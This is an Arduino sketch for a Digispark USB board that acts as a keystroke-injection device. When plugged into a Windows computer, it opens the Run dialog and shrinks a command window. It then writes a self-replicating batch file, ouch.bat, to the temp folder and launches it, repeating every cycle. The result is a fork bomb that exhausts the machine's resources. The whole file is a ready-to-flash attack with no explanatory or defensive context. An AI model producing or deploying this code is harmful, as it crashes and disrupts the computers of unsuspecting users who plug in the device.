#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat"); 
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("cd %temp% && ouch.bat"); 
  DigiKeyboard.delay(500);   

  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
